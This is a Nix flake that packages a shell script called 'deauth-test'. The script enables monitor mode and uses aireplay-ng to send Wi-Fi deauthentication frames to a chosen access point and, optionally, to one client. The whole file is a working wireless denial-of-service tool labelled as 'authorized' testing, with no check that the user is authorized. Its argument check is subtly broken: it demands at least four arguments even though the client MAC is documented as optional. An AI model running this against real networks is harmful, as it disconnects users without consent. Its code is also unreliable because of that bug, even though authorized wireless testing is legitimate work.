{
  description = "Authorized WLAN deauthentication testing with aireplay-ng";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };
    in
    {
      packages.${system}.deauth-test = pkgs.writeShellApplication {
        name = "deauth-test";
        runtimeInputs = with pkgs; [
          aircrack-ng
          coreutils
          iproute2
          iw
          util-linux
        ];

        text = ''
          set -euo pipefail

          if [ "$#" -lt 4 ] || [ "$#" -gt 5 ]; then
            printf '%s\n' "Usage: deauth-test <interface> <channel> <bssid> [client-mac]" >&2
            printf '%s\n' "Example: deauth-test wlan0 6 AA:BB:CC:DD:EE:FF 00:11:22:33:44:55" >&2
            exit 2
          fi

          INTERFACE="$1"
          CHANNEL="$2"
          BSSID="$3"
          CLIENT="''${4:-}"
          COUNT="''${DEAUTH_COUNT:-5}"
          MON_IFACE=""

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root because it transmits management frames." >&2
            exit 1
          fi

          case "$COUNT" in
            ""|*[!0-9]*)
              printf '%s\n' "DEAUTH_COUNT must be a positive integer." >&2
              exit 2
              ;;
          esac
          if [ "$COUNT" -lt 1 ]; then
            printf '%s\n' "DEAUTH_COUNT must be greater than zero." >&2
            exit 2
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Wireless interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          cleanup() {
            if [ -n "$MON_IFACE" ]; then
              airmon-ng stop "$MON_IFACE" > /dev/null 2>&1 || true
            fi
          }
          trap cleanup EXIT INT TERM

          printf '%s\n' "Enabling monitor mode on $INTERFACE..."
          airmon-ng check kill > /dev/null 2>&1 || true
          airmon-ng start "$INTERFACE" > /dev/null 2>&1 || true
          MON_IFACE="''${INTERFACE}mon"
          if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
            MON_IFACE="$INTERFACE"
          fi

          iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null || true

          printf '%s\n' "Authorized deauthentication test"
          printf '%s\n' "  Interface : $INTERFACE ($MON_IFACE)"
          printf '%s\n' "  Channel   : $CHANNEL"
          printf '%s\n' "  BSSID     : $BSSID"
          printf '%s\n' "  Count     : $COUNT"
          if [ -n "$CLIENT" ]; then
            printf '%s\n' "  Client    : $CLIENT"
          fi
          printf '%s\n' "Press Ctrl+C to stop."

          if [ -n "$CLIENT" ]; then
            aireplay-ng -0 "$COUNT" -a "$BSSID" -c "$CLIENT" "$MON_IFACE"
          else
            aireplay-ng -0 "$COUNT" -a "$BSSID" "$MON_IFACE"
          fi
        '';
      };

      apps.${system}.default = {
        type = "app";
        program = "${self.packages.${system}.deauth-test}/bin/deauth-test";
      };
    };
}
